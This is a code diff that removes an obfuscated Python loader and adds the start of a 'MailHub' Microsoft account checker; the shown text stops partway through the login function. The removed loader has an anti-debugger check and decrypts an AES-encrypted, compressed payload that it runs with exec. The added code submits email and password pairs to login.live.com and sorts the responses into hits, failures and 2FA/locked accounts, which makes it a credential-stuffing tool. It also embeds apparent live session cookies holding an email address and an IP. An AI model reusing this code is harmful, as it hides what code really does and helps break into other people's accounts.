@@ -1,50 +1,119 @@
+"""
 
-import sys
-import os
-import base64
-import hashlib
-import marshal
-import zlib
-import traceback
-from Crypto.Cipher import AES
-from Crypto.Util.Padding import unpad
+More Stuff Coming Soon...
 
-def _anti_debug():
-    if sys.gettrace() or (os.name == 'nt' and __import__('ctypes').windll.kernel32.IsDebuggerPresent()):
-        sys.exit(1)
-_anti_debug()
+"""
 
-_KEY = b'\xc0BY\x89\xf9\xbe\xd6\x91O]\x0c\xf7\x7f\x11\xb1 \x00\xda9\xa6P!\xbe\x836\xb5\x98\xed\xc0\x06D5'
-_IV = b'hp\x8c*\xfe\xb2\x91\x10mq+0\xe2\xc2\x03\x02'
+import requests
 
-def _decrypt_str(data):
-    try:
-        cipher = AES.new(_KEY, AES.MODE_CBC, _IV)
-        return unpad(cipher.decrypt(data), 16).decode()
-    except:
-        return ""
-
-def _main():
-    try:
-        _encrypted = 'Uw%F<JWKTCp?UbLrIB<wYu@(fxJ-d2u^pt;jr}s)9x$)+*h^w}o^2!=AL)U)57-0^CoDBH+dM0;Q&i_#x{t}(5P2&v0Tf2D1soE)MpofSu!-*N0^$KX$^<PhEwQBe;?4;jfjEI-TS3!moq>5WmFdSz;_=n`=lm-=hM!d4=41<Fv}JocxTJyp>M2F$vG{EyA&Bi^Rm{{w)4TMFE8()1a`FLPxk-qRp|_Y$^04<{;hF(?ziX&~F&~cquH7i60|wM5xB+Sit!sN?(6OgZu{>l>s(B_)+#2eWObk>IVjdV6XHqy3sU6LX47mImyT~Z8O1e=~mJTz6zo=M8Vp(~9jT>N%p4+aSc8)Mmx73nIp7xBjG74m`Uk7`q^fz?S#O~@`uwZngj6%ZZpm>RPMG8u;Yv=THap_`{P~552*UZ3%8vKNrluWjp*nytDcks!dLdi?9#@6_!cZL+UD<*RYOR6|gB$g+{0<n8RTmQ%nYV%*LgBtFMXBg*k3kUy4F@J&p;tr$`EZ%K={YO#xoTn}|B>?UDz}AIC+(P__6%1uhlSE*FC$C3wbbfojb+Qdl!>Z6p!5g<XNMvx_%RAmk0}e;1d79*bAiLQK%kO~`z@$7oq1cdaPNVNlzrQWMHLrL3gCr6nQ0V4mRPKZfwdY!x&HC^6X=mFi;aPcgzw_i*m+cGWqkiD;b%KZiWq^Q%^0WvyW{CSUS{a%_VI#md-kLWrb~kxdp)oLt;OH^koe<?}QANuY$%;}VBEHKcOLvs&X*aA5KE=XQ(ZVZQg`p<zuD*J5pt*82(-sl4GWQ@gf`EclFU?l*i==I*35TModdAQ0uk(ou6)dvc>=RaIo?*4$Ml4ndYvbvICL^CEs`0Q`^l;46=zW2*!Koo%I){U38X-|ND2a!%uCIGPfi2J;GOQ#hvvXEq_1(92An#Svf+c>8mB>{qZOpS*jF|$TSSMhr*3L>cDb#YI^v$@&q0%y=!`*AzZTi$w{E9#=3<rRY2dG{HBAS@t#HQ?yySvml%<w9{AgJjgL)j+adDT+O@?>-sNBk(>+<<@rO0RhZ9a3gh<8HImFnzz79^mV*h@G@!!Tqb>wB$4h+HTeJ!m#Bx8@bYh_WK1>l{U2<NMPoHf+o6vK*yP4WfvJdIXGz87QrE!>WrRN26k>3nUDUtM5y!}y-KAt1`jv14&TEqh4wZCZD)ZtejBBMKD~2F#m>9aWD<fLxvI(t6XArAd{nvhW4i)<(;ZQucw$lUvtpMGVXm3(MO*qAmphQ?eL&`r-A#{Va{K+<vjz<7)*jigzpp%50*70=)<;D96@g=Sj)43hFa6$>iI#(a{>iK|_Yv4+*_JGh;qtM-my%R9M5!fUJvr2Lv>{;g$cGq%<pW(yr(uIhkk-EqJ?@L3%X9iBbj#lK;>i5VaVR#<h-fTb*fQ$UT;1k4R(3icMz-@eJk-38cg-CHVm<ky=A5wtRlH_TMVZgqj(Dx%jwbWb(Bw-jAGB~RVj9wIfsam=7!Rp2KhpinVizqSw_K#UE>^!A{WrBRXOfIRs5q#h5sL}1OyS*#<9lIGKP1lnFiqzsW`2YVIgI7=Xc#rTA|%F(Mjy8y{JSF);pH>wqqO%Nu4eK@BLl%LO|MkNx?z>k@4+K)SM>?$Pi>-KzdklU&i+nImt^QZpk_YFDtXKAbZ6iLKY3(FCH9mKGPg!jLyK|yy3lI73p%7ZI!vn4JE?1{$?+35EDs8!UY9)aYU}q~6FYW3@)|DIzjED^(~rwXX+Wx`^=qQI+N*a$>0rH4Hb<+h<#v~MO+xZjg4kr8tVx6$Th(u{J$orPq{%Z<FKB~mehIWO0%Np;?Bi2Hv{f@1M4&yCMd`CWFssH<u+X!K$Flr#2+ODM+YZz76SF!!J^G5S#m&2<a!_F77QOP&rug)HfP`1rC}{7*AzqG>E&|gvwi+btLN7b*y#6oE<d(-d0B|s56TTps*z#~S-s$@jwP)u2796hs%Sm*n`adVmnybOc#Fp*GU12IFoZfUj27Ncf`n;(fN$HvllsqEYtF2xuCl54t?E3~1+F3~9TU=ChcjY_c5T*cQFfaV}-uBsp+#xqx1@H0?=!4!aQ-sE`t@)JZydpZk&*tM4tBD;@D&g)K+<z$zbWhmRpf8dN#`omMROlAj@vV=-kh+Y#><$de6Pcw<<9igH90t0Z70~lARr03Z9>82?*fS@cODv@Vy87rrwM|ZRK$Xs(35|FRD(BDy!6?aiQI!$8arL~C|L5t+mBj7IuIMbVhE=8K)NdD(`wj(WTcC?c4vY|B=qW@`E%rc)1lwjfx0!W-Qpw3TlgMWsbJGaM!9!hQ)OMczd5>;5gkOLZe7Pzt^T`rW-Jqzie2|Aj;kHXZx!)?jYYt(=ZG^YrYYF={P^^qJJRC(nw*G`k_N*X;@X3Yd1vwtc9P|4g?Db0X5co84(Y#^1bOiyMdUs+x^GVdIkwJ+;IL9Xv4f~5$Qh^$2S)jimdr;zKvwB@Wor(nh(0l9avBD{~W}im&cuZrEZ3L8NN+mEW=(QeA5ptf;e0Q4P7=bG?Tk%ZzYnSB(mv<|J;sjjpcE}->DGRCRk=?nS9~|AxV(Z(mPA{XmVvNi0jtqQT<hbO?nE-Xgtxp!Au?wd#mHBaMG8G?go|W#NEYr&yxUV<^k_TIOdA#UYGBycvT*3$LM5uOu2vS=>nF01Kna?FG)sPx*`938~f9)QWdo`#eo7$Y<f#a}i|I*)!2Sh5|;HG(zp`<?T4;H57l<5!?*n%*Uy!q4LA_o$rri%}zt$98hbMzjBzDUDDIRk{CK0P^5t(Y>?cXi+`(x(d{e*Z$tjkddf@a&i(GqZgfCsW<p&h4R!RJR4xbiv$-%&d78S?b+$ni#406jL#R|5R4_@)r`e&Z}+W9(z6VnpY@KK6{i8DA{&HY%GNaOmZQFH5Vn*$z@JxrX6&i@*TWLUjtmAFeEvltWpC?BpwT|oX~G~tWt`?y^<bGYozu~s9d-hc*`v+o{=hmD;mBw%fy_O#DUr!s&R)dSv6%Wu>xoyR4r#x(^5sHJScoZFG=VB_AIvKOqa-Xb!CoI<izMjgQYrE!DNC|hHziG&Sbv>wE#}ssiF3Tx6En#&6=s#PKcR1Kr3P}p{P~l2y@0~`>)&A453xV2RrxEn*ZZ^HTZrM77p?VL}bv=EE=)b5S+iIaznQXyS6@G8%NShYwXyZuf4~uFn-~-wW*UU4cl#yH!~?QPA1MIA~S3)6e(_N#!mdv%Ape4tX3I*PaQir1D-&+^HAang88Va<268tH~Ade@x5`wT|Aihb0lt50Z2jRGd_@fp_o6<kkfVm*ij5BNjZ2aN7b!zchA(g%mO)xilO$cQmnA(L_*=zvpOH!v;<22iP|Juer3C)<KzLA1k^?3faSb3KP3EU`>L7WzS1V=!2aRH2fKzt8PSxT<L9M>)hNT^BHRK<P+tC#Hpw~6M4d~4TPWziU8nf<{1VD*v^UO7S)ncZTxlwGcq?B4rXUj+p1ZfX1)Z4lkGRnjg{ZIqe>kc#9G)SX@sFFR>W?3=1gltCH0`=6<H=tMLdiLeD_Z4ilVk#7I=<FtlLD{X<(k7Dhfj-CF@T_X=^qZGIm*~z2>_6#P~7-F=>=g}%-hXQ8<*cZ2`u;8v0F$t`u^Om)C;A25pg_CokQ-iusIoyP8mFhKv!}w%^(U|?o?qXF1*Y{xZnzer96ZI{$}pcOl;6S@@z+s8S2Rth4GwByr2ig!A%2h!W+L2DlCxO0!n`zHg|!17cF1XG2A+!N{6v=)}}Kyb&XBb6GZA&N5I%-(+N}bd9(T+zVef14djJN@K#^C&6`19VHAyd{xu&2ogLbWib5_m(!@OeyQT-Z2<OjeF0_PKJ55YKNJT84huT|_>oV5Dx@+-i$37n8^z1Y*N98uSG>Fftow!^iGeQXkk*PhTxf^s)Yh;dxETYc{no!kzso-SGN&Ct<5)->z868Fm@rD&2G}PZr_b#Ffx<$f1`D#sOKrpCHc3167V54wO@!<M@m3IHHQF*Ftt}qY)dV#ZCsZMuPK6CP@p>`HLR|;D7lo1Sj=Q6A$<oB5KYTdHO<H(o|#U+vsbyuKYTX4ro3iQ8>GPf>LP6U@Y{k}2E(Z`*`!aDsvMv0DA8)FJ}gwP<9{A3GR?V@YuHn>+eQU;~;$gLa~)`&z=$-_xE4yWa%j7~H^-xaOhUqPCp_jRsq=M4)9gly-JsgwbN=%A(bHJhA+%U895C876v@FUASb_Yz8*!BdCtlnm<xv8hoGMRs`R!D-9bQ*4!HfVm@cXipO5%|U95RnEpe!0z+hK^k8Q?TWYUBwbxZuT6)yF@;$fA@LtXkB_+?YD)lPXg8KXoDr4Kr9saTl#M7dDn&nh!NCCv!cP-OQ2RI2Sc7hUn9a^S}C>Cytj{PeA7et%YB!H66nlKc7Y2I!VSU)FNMcO7Ek6g6)V4!BE6-R`%#MpfGchaAOe?~o4Ahumc$^t@Zcs@_LSRsVCwRJNy0-A3s^_GA|1tE0q6{90QRy7mprd7@#$DsWE`s_yOE@M26FQ*jTMPPI+I|xt%51{jP~@ScHD;KN-4%<72ZwYNXhfXyg!}r%nDg>{Ld@(WsoW8Ziw*Bg-aqvjefrllNvMH4;8+lDq*CK^6g{qt{HL-AfdwAlClKaWgmd-K1*u}3wvybm$yduka<Ry7i-mzsmcGV!sn|w8No}9YZ(fcD&GkcP_Q_!MSv}nmc;#pAoNUK+gr|88kP|LDx<@ses^wH3lH%NW%anXSo$UA2FmkPr`YDA)g)eibjL%Rs*vL9v=?}OG2v3k^ZZmsKLA#w`4SO~niW-#Z+73^lo^E;f+MHu5j@fYtqPi@9;mQHc^+FH(Ag!&rT4F;L^r)n)VAG!F>xc}U}j6P;yf1^^M8{!>Gvq#=i8iljlT3~oK%k9##0mJjZ5v=r5g&*l}QA0!9b=qqzk?yuaXY}{FLNuu_Uc@s?!LkCj3Qna5{ai<;5SvBMd?+*#oyY@@k>tw2e8sfWk6jdz&YbW*opeTKc%jKWSUPO*C7FmGf1jF64kX1q-d|emSj`i1~hMuIG=sos|UJpj&h75u@nzf|}M#iw?InU}rHQa;qsz2XQ~}LLk7d<*$=CD7cRvFqo?kX*{P<isqoY4kN^`Oipx&HyGg(y!Vi(=$tJWgP;{orFi;8XZ{#g@PeoWt9HsJl0<`JYlpL4KRq9K@IUjuY$nWz5$@ARX0^BdEB3Lwy>dijR2yKdusIG9)|#h?e_i%~)XbkQ9R@tF+oUPlP^97q`ZHl!5O&(~5YYLSDNAi-6w;&3VnY&FRdix5#}v*GiL%HI;H$}K05X^(kEEdsY={8X`RC6v<i6z+b6Z4s9G(Wqay@6AsY9#bo?f(Xp-byGDMKnvGaLPw%Y{~4BILpi6Y)D5(+)tm6hZTp{Chv&>>s{!J;q~yo>Q=oDwOxk&6Q-bJ}!8doOPMZvnQ_`taZ_*2cP0Vl#=sm=x{tH=m{oL@qTLsd6^m!%WQIVm|#f=;#jPL%2c|j4BhyHC=&;GADyQ*-L7m39s0L^5R%3t;}}N~5mEEX@7;_-rXhrdERycA$Bt+u>F&oMBdTi3u~wd(KutwE!AfRnP;^Jx_{@d}j{1nP$+FL+)N6bA@g7aD2nf!$)4xs`jFl#(<8cCvNac~h^-Ypq>9+6c{ZxgQ%YDZ<=;Yb)W6B%c?(nv#EGLa;6op4=$`K9H;Y5$={0MexE~K!2YK%q}VDBv%Sh-l`Ot2*T=V`p}OU<FZOXCPpv)KvM^f^*=)2mNL;qEma3%#!_3EOoJNv1V_4GXH~LK8jm#t>al*@*+A1;OcF+#G@wks}EgNB?o^3=!1oDu<_$Rz<ooc6;(ujWoF||4~cYSaaKflpP3cE4twN6j>*5EHoUd6FGBO!j=y^ZDO#IGTNd;P7<hL$86s@3yTWh7yJc`JY>R<R2weYJJskLeN~6?2h}rvhQE5=de^tmsSsG%<0Njj85sd+Vi2?HP=Oq3X)fvHmX%zLG*na@2Aq*yXVZ0-Q=$*O0_6WwfQ^PaVBn8SX<bK}=LkS*##DtDZBo?q|N4?~C4^plA(at832MvSP9@#r?$bU7a)lO7F5_{DyAq1G!K*6ZItxLv)=NfBw`{%<|I$h(>ZU;0-o+SvEf}M+M+KSI`UTuI1eTeRS{z?z2Vn~Z&vGCwt;wVUMV1J;<@q6N1c=aN?N*t@wxiL`)ATeVTP#W!{kmB6V=JpkMcVp}M!aNn^1_Xx?K>T6H@XcSm966Z)^tqw|KgCI8G$G2N{ZU!>M94vWlP6#=9i`V8Z<3WQ~4B1joQ1X53`2jKU)?;RuEbGD-<lP!dL%^HR#)yMSW)vU=W;w`w_6buM+Ts4=os#4Kc)39B}q{&!c6vxM%Xv5or*(YlSba`!;tLcjTY=;JpHKqhM@Yu9THdvv}To_Nm`k8WM7(jBmdGh*@P7W~a<gFYcB}kvLO!_@x2|U&<7??S<!mekv1SWlr-Kn;{|$l<D~^|06CeBJy#xMfGpK?{Qxdvu(OB8FZ_X5FD+Qm7SwcP}CUu*HpZZ*ZJD{3j6s4fkQ^$WKJSxF!;F}C^i_}*k(EmO>v3nD8Mbiz*TWo)@+Z9yOzOCBIIMTh%5^&BC7Eb4qy&4!UDUowM}8Kz@G-nE#&ddwunu%6*}jP@3$g04Hs=586jm9(#u!wH->+bkxnoq2W>R?YM0@|{pv$3%U1Ldh(%=du$^t$<Sv>4(Qa`#^?_~z0h#9GZG|uN-4_jyl=74(`+oyT4>5_R?$0AuwJP5e4cWcoW3+LOgft=TekD!SbopA++f5D0E{ej_(a<DNScAAE(Oqzx*Uao(-`I^vxX>#D)R!uQ1k^5EQ+<mRz_Qn}$0an8ADJ?vo$95d8SoV@xzpzYX<29HCw`Y;Mm^)e>CJp>%r!l$VIeAIj8FU!5%=X}dtdyo+`9{g*~eB{(^>h7`G){wfilkh^WWeIntiJ9hX~C6rh@0OR6l3(;}@7#H}MK;u$sW`uKywc6Kv*n4XxlGya5PaL?nTWGu+lFJgG8?#hz^EOcqzjD-lkO7tW1V96P-c2fy3LWVr>>b6#73L$Tx#5bg<V#H@oPbgtccX@*+xIz{r@!6ZYdk$!rwLTZ&<)j_(wlluCm%{5}Ki-Y7s%TYrtzktuk1~c#p@vi9>G!HrgtH!OSY{vs<N=_FkC}-IMx;?>vnOK(lLT);N!}o=B>D7mGtGD3lpL6%j*hWaQ&2D+CSV#5?W*fE>8j8T_KE#KLixGHQf3D1BPlnUTh#W$r$D#bmuk08~BzI5|Qf<>8;m-x@T)mktS#i=71}R~|BHTmZN>=eRxI*-+#s2U`uS}pwD*mSk6Uk>cQghguE1t}6G}Akawr5f}hvHP&#TJz8R2-xID=@l}t<TCSutT_8@=--SEoxmmIk;he7q}W?t_bvje8{KTaxubcj%gRs1eFKt34SAOz{MH?J>PlySDyZe_c0xiWWJ!<Adm8|)%_m)6Vgw>u5W-6CWwQ1_W2o2@L29<qrc=C%hY_EdtsKHU|GeUPmHmJzFMEYF(Q4?Csl%AFf4>|7iSR~@MTwSoW)yfBS9NWyfRX>$rPL~s6ykL=T(9ynJTeJg8_n8`t)I%wjK8H{IG5@FOubJe#8ZqH_UG6pZn;4h3|*)u{U4$3(ErN_YC2DnTCAxc%yM+*FfFqvPb9gGNqI`+jx?L{vmpP+c5jpHETkQ(ko|G8t}@o6N%}%X*00IJnR66xmQU5UQc}<DP?WWPS%h@t}nBfOq_rKC^Zf$wVP>y2`tKPv{A9}&zqI>Rp_<Da;+b6Whu#(2BGyTL={4tIf>R8T0xYz#$-I1hJ}X0ej8s0hvRKy4v;|d;Y;l88?2Z_A@P`=Qu-|<_&vGaXuw-P9r|8IZFn3;opa2Z5|8L}7saw@1PO7#z8hJPp<W<GV09tqr1gms2Qu-Sd(At23s?C8n<ub%uGs1qVyW@1UwW3*HTSFjqv^qhDBxL2He;0Kz_4N{RGbBAP==XWnapR6%iFb-_7f$~c?pO4<vzE_(=5{KBxSMbbpW1agjK8A5dp!%hw70rc2F{(INhpB@VVS*EMEu~WUU}0y+&X#fTJB+!)Y>DQh3Vz;}Gr(m+86C_~bLpUCI(<j?4%;EX&>;Y0aEHAI~GQp&1)6Uzu4u->BN$jZlToH?r_M<nwvRF4*w@HSbq^{iHw;zzJQnoXj@X{N!9vADBPPp@StMmp3K487ia9uGZh$6zR~(h*<?fjX#+wq$PLXozon1{UqPkc16ycHUKrAUxF^r0gX0D$_Quj`4@vEXyMgCXwpP6(=f({I&g^wvPlBaHD3g_jeV;fzWPPQ<UruWPQ%+{X{BuAPn_~Ou+?1iV8$e39tK?xw{h-pEy?`DYzf8WV3H|{eK>yS1D-NpPuQ&b?jkG`Yahavn9>NGo%#E`NjE>6@KmG(rx!W%>rUUixR#a2NmE!pEKFR4C~auO(kSK@Wo>jhQqXQN)<G|G=^?OGlh0tN%RrkmTUeJc*I8Mr!xf~!`WD|+CO;|6kU5-;j$*q9Y%2!H>v_qGR7Uam6+#E<dw@qY{F0tYHI(_dJrqg13~~;uhUm)@T64Kvmoy*?L_8ba%J0Y6y#j8b78uQ<{Q~9p=;z%`>l=ob3fEbSC2M!IfvPEy3j3f60pen54g)%_BZ*@1I<!K)Ut^?A+*U|nesK2(Z}g|{WJMYj+Gu#EHQF1^{3xBd6iT$$brE*i<BM-B=^u`yB3_{keM@1fo{$XNkvKsC^DksQzUUWqRk?-4`qIfUcU4<Vt?Dc;FHEs|#oc{^Ca1WoGwtBopl`F)UwsqMlE7z~Z+YyyQ%ba^X7h+<0E#po>>Zk&exKXiZWN-|hh5NTGK8ORF0|>!E0OhNiM~`W3h2ssK3~v|=e|&akRP`00^QD4yOZ9ipUGWhe~^|^s|hY`XYWQs;Yt3eLnVyVRaGT_<lxDZcZ`LV=A(QLs@yR{-i+5u<ERq2E72VqsN?!Z?!1bEtVsqqAC)^*j=>sXO4d-yIGx;q09+82qEl&#-iz=U<QOd-t5QI?v{3Zk9JqJB;ax3kd;zHgNGMT_@7skNC(m8l8Es`@IYL`9qipmW^lb=r8W~`9JWf2ItM{*~8<qFGMiW}AI(N-{jE>d@<=ru^!>5mnaLWRxK5+S@-$qIwNtK%YaMZvsWuxPE_LK@GQpUfTCH}9;{NT?5J>;7%;u+^FH%oY*#7<4qn}t?j@zO>NV&#kTt*ZC0_yrE(4wH2jTu5LnxNv>zjZA!}tUqZ6`;6KvfWnc9CmGYp5|XOr%SIO~Ueu5P@b!pfLMtoUKq&QWmr(`MK*KNA2NX?bm+|S2;hAUtx!%}bna;dik+YakiN{Dlz(Q_ZhV*Ch)>&}H%}W|oXq!bW`I~9@a-yHAU}LLO5q@28(gz~$5JfB>>P>dzg}-)xmn=<Gby))ARu(lYcYJ-65*BU<Ba9;uY83_q<A_uBl=#-bePP>)+q)fc!dsWK9RZCQh2UNqJ=QD$in1FHq90k5r)}E1|8FG9<wvM;mr_W{W61Og#>cWa82`C)PR_3|wipKs#SKjr=elJE>VxU@Sv3FZ@zJ1vVwQ^dJW%-6SaG`}9}YqUuwd;Yuoj-Wt8s|j?t5qdEsTm`uI*T2nMUUv_fvX<iueWgxnnw4TG0`NM45&U3b|RK8e;vxwNXE1fd-9gZt|}&G7_gkh_5g$4!15NXlBv=Wz~3MGz-vd1`f&c%X)hQ1)#>|`njJ%QRm)lJOx_MuL7|Jq>JF2OZ{H4{)UoOjV^C0'
+class MailHub:
+    def __init__(self):
+        """
         
+        MailHub Lib 1.0
+        Mail Checkers
+        Dev --> Not-ISellStuff
         
-        cipher = AES.new(_KEY, AES.MODE_CBC, _IV)
-        encrypted_data = base64.b85decode(_encrypted)
-        decrypted_data = unpad(cipher.decrypt(encrypted_data), 16)
-        decompressed_data = zlib.decompress(decrypted_data)
-        
-        exec(marshal.loads(decompressed_data), {
-            **globals(),
-            '__name__': '__main__',
-            '__builtins__': __builtins__,
-            '_decrypt_str': _decrypt_str
-        })
-    except Exception as e:
-        print("Execution failed:")
-        traceback.print_exc()
-        sys.exit(1)
+        """
 
-if __name__ == '__main__':
-    _main()
+        self.headersMICROSOFT = {"Content-Type": "application/x-www-form-urlencoded","Cookie": "MicrosoftApplicationsTelemetryDeviceId=920e613f-effa-4c29-8f33-9b639c3b321b; MSFPC=GUID=1760ade1dcf744b88cec3dccf0c07f0d&HASH=1760&LV=202311&V=4&LU=1701108908489; mkt=ar-SA; IgnoreCAW=1; MUID=251A1E31369E6D281AED0DE737986C36; MSCC=197.33.70.230-EG; MSPBack=0; NAP=V=1.9&E=1cca&C=sD-vxVi5jYeyeMkwVA7dKII2IAq8pRAa4DmVKHoqD1M-tyafuCSd4w&W=2; ANON=A=D086BC080C843D7172138ECBFFFFFFFF&E=1d24&W=2; SDIDC=CVbyEkUg8GuRPdWN!EPGwsoa25DdTij5DNeTOr4FqnHvLfbt1MrJg5xnnJzsh!HecLu5ZypjM!sZ5TtKN5sdEd2rZ9rugezwzlcUIDU5Szgq7yMLIVdfna8dg3sFCj!kQaXy2pwx6TFwJ7ar63EdVIz*Z3I3yVzEpbDMlVRweAFmG1M54fOyH0tdFaXs5Mk*7WyS05cUa*oiyMjqGmeFcnE7wutZ2INRl6ESPNMi8l98WUFK3*IKKZgUCfuaNm8lWfbBzoWBy9F3hgwe9*QM1yi41O*rE0U0!V4SpmrIPRSGT5yKcYSEDu7TJOO1XXctcPAq21yk*MnNVrYYfibqZvnzRMvTwoNBPBKzrM6*EKQd6RKQyJrKVdEAnErMFjh*JKgS35YauzHTacSRH6ocroAYtB0eXehx5rdp2UyG5kTnd8UqA00JYvp4r1lKkX4Tv9yUb3tZ5vR7JTQLhoQpSblC4zSaT9R5AgxKW3coeXxqkz0Lbpz!7l9qEjO*SdOm*5LBfF2NZSLeXlhol**kM3DFdLVyFogVq0gl0wR52Y02; MSPPre=imrozza%40outlook.com%7c8297dd0d702a14b0%7c%7c; MSPCID=8297dd0d702a14b0; MSPSoftVis=@:@; MSPRequ=id=N&lt=1701944501&co=0; uaid=a7afddfca5ea44a8a2ee1bba76040b3c; OParams=11O.DmVQflQtPeQAtoyExD*hjGXsJOLcnQHVlRoIaEDQfzrgMX2Lpzfa992qCQeIn0O8kdrgRfMm1kEmcXgJqSTERtHj0vlp9lkdMHHCEwZiLEOtxzmks55h!6RupAnHQKeVfVEKbzcTLMei4RMeW1drXQ0BepPQN*WgCK3ua!f6htixcJYNtwumc8f29KYtizlqh0lqQ3a2dZ4Kd!KDOneLTE512ScqObfQd5AGBu*xLbcRbg6xqh1eWCOXW!JOT6defiMqxBGPNL1kQUYgc5WAG8tmjMPFLqVn1*f4xws1NDhwmYOHPu!rS9dn*trC71knxMAfi5Tt69XZHdojgnuopBag*YM7uIBrhUyfxjR*4Zkyygfax9gMaxxG9KScOnPvemNY1ZfVH9Vm!IxQFKoPoKBdLVH5Jc7Eokycow31oq7vNcAbi!cS3Wby0LjzBdr8jq2Aqj3RlWfckJaRoReZ4nY34Gh*eVllAMrF*VQP1iQ7t*I28266q6OQGZ9Y1q53Ai72b!8H5wjQJIJw1XV4zwRO8J02gt6vIPpLBFiq!7IkawEubBPpynkQ3neDo92Tpc71Y*WrnD6H8ojgzxRAj!DIiyfyA7kJHJ7DU!XSg*Xo0L1!DRYSBV!PKwNM7MaBiqsKbRWFnFyzKhBACfiPe8dK5ZUGBSpFbUlpXkUJOb247ewTWAsl9D4G6mezVjGY1u9uOYUPc3ZqTEBFRf4TK94CllbiMRC0v26W*qlwOl0SSpBufo8MtOUqvowUFqEWDDVl9WFV5bT2zZVUy4kPj9a*3YNnskgZghnOCtQYKIIRdFTWgL*DcbQ4XRL8hMisBDjyniS16W2P!1FH0dT12w7RlsJCdotQSK1WppX8sGWNrPrYNcih5ErXVZtYKbqrZLw2EcyGmkp7NxBHFUQXx*1tZSEeiWoZ5BrHSiEB7X2gB7BQDP7RbVYZS5UXeNp3rlGdN*5!nUGK3Fltm1sKFmtZU!T1Q0WaeFwVvpFYSCxg9uw6CC!va2dB*R6NFK!3GNBDrCvbXnJMaKVb!UoBP5G*GASdPnuJgb3cjUE*DIYMJRrPT!dZoHd5BAQSF3vBoPZasphWeflxXFMPBi055OBEawIzxOqS6Wn3IZCp3dgk8QLNssATkzwZvpUM5lSq710QTMZWENDKp5gTIlWcdYpKG1d8TmRlqXRJN7bdUuRIoehIWqnfSuJxGoNk6PM3x3!gMaxPxe1Ch6hMmsagHM8fFQ!MpP0TQ9nsIxh1goCaL*PbHDyj1U3btyu2RXibwIwgV1h5A6DgwmgbaH1Hn9LpdLipiT5fGiRbI903!wYUA3MgQg98OH9BQaJPXte1YpL8iUjUA9MreaZTQ5P13cUiNYrkTW2jVr5PTpEJvwpg*8piWEo9k*IzOCr6iKMRiZwTft*QYEEaKxbyvgLG*s33uhCN46R9J1VwPufzsxyGUHYyE5S1mhx8sWxw!pndIQ!RgVEsDfzvOO0H2P1hBGQG8npJ18th2WKYrvouqHZfRBcEc77hsbXUKec2lv4ETHag0RdrT6kFn03RDX*p*Hac*nugVJK1j0GouxkITbOmMjb8cpau*Lf*xNBUFc3roCuPjEpAcR48X51rIGpOjhAe56Q6CbwIuVe*z*KmRptzngkT4!AB*FGGKh2lOi6b0qR1w4Aia2g1pfjJU2G1r*Q!kSNxYtGn0WOkHiVkhAXQCvkNFp3q!ivZs3obM!0ffg$$; ai_session=6FvJma4ss/5jbM3ZARR4JM|1701943445431|1701944504493; MSPOK=$uuid-d9559e5d-eb3c-4862-aefb-702fdaaf8c62$uuid-d48f3872-ff6f-457e-acde-969d16a38c95$uuid-c227e203-c0b0-411f-9e65-01165bcbc281$uuid-98f882b7-0037-4de4-8f58-c8db795010f1$uuid-0454a175-8868-4a70-9822-8e509836a4ef$uuid-ce4db8a3-c655-4677-a457-c0b7ff81a02f$uuid-160e65e0-7703-4950-9154-67fd0829b36","Origin": "https://login.live.com","Referer": "https://login.live.com/oauth20_authorize.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&redirect_uri=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized&state=eyJpZCI6IjAzZDZhYmM1NDIzMjQ2Yjg5MWNhYmM2ODg0ZGNmMGMzIn0%3D&scope=xboxlive.signin&service_entity=undefined&force_verify=true&response_type=code&display=popup","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",}
+        self.failMICROSOFT = ["Your account or password is incorrect.", "That Microsoft account doesn\\'t exist. Enter a different account", "Sign in to your Microsoft account", 'Please sign in with a Microsoft account or create a new account']
+        self.retryMICROSOFT = [",AC:null,urlFedConvertRename", "Too Many Requests"]
+        self.nfaMICROSOFT = ["account.live.com/recover?mkt", "recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "Help us protect your account"]
+        self.customMICROSOFT = ["/cancel?mkt=", "/Abuse?mkt="]
+        self.hitsMICROSOFT = ['sSigninName', 'PPAuth', 'WLSSC', 'name="ANON"']
+
+    def found(self, keywords, resp):
+        for keyword in keywords:
+            if keyword in resp:
+                return True
         
+        return False
+
+    # ----------------------------------------------------- #
+
+    def payloadMICROSOFT(self, email, password):
+        payload = {
+            "i13": "0",
+            "login": email,
+            "loginfmt": email,
+            "type": "11",
+            "LoginOptions": "3",
+            "lrt": "",
+            "lrtPartition": "",
+            "hisRegion": "",
+            "hisScaleUnit": "",
+            "passwd": password,
+            "ps": "2",
+            "psRNGCDefaultType": "1",
+            "psRNGCEntropy": "",
+            "psRNGCSLK": "-DiygW3nqox0vvJ7dW44rE5gtFMCs15qempbazLM7SFt8rqzFPYiz07lngjQhCSJAvR432cnbv6uaSwnrXQ*RzFyhsGXlLUErzLrdZpblzzJQawycvgHoIN2D6CUMD9qwoIgR*vIcvH3ARmKp1m44JQ6VmC6jLndxQadyaLe8Tb!ZLz59Te6lw6PshEEM54ry8FL2VM6aH5HPUv94uacHz!qunRagNYaNJax7vItu5KjQ",
+            "canary": "",
+            "ctx": "",
+            "hpgrequestid": "",
+            "PPFT": "-DjzN1eKq4VUaibJxOt7gxnW7oAY0R7jEm4DZ2KO3NyQh!VlvUxESE5N3*8O*fHxztUSA7UxqAc*jZ*hb9kvQ2F!iENLKBr0YC3T7a5RxFF7xUXJ7SyhDPND0W3rT1l7jl3pbUIO5v1LpacgUeHVyIRaVxaGUg*bQJSGeVs10gpBZx3SPwGatPXcPCofS!R7P0Q$$",
+            "PPSX": "Passp",
+            "NewUser": "1",
+            "FoundMSAs": "",
+            "fspost": "0",
+            "i21": "0",
+            "CookieDisclosure": "0",
+            "IsFidoSupported": "1",
+            "isSignupPost": "0",
+            "isRecoveryAttemptPost": "0",
+            "i19": "21648"
+        }
+
+        return payload
+
+    def loginMICROSOFT(self, email, password, proxy):
+        session = requests.sessions.session()
+
+        if proxy == None:
+            try:
+                r = session.post("https://login.live.com/ppsecure/post.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&contextid=A31E247040285505&opid=F7304AA192830107&bk=1701944501&uaid=a7afddfca5ea44a8a2ee1bba76040b3c&pid=15216", headers=self.headersMICROSOFT, data=self.payloadMICROSOFT(email, password), timeout=100)
+
+                if self.found(self.hitsMICROSOFT, r.text):
+                    return ["ok", r.cookies.get("X-OWA-CANARY")]
+
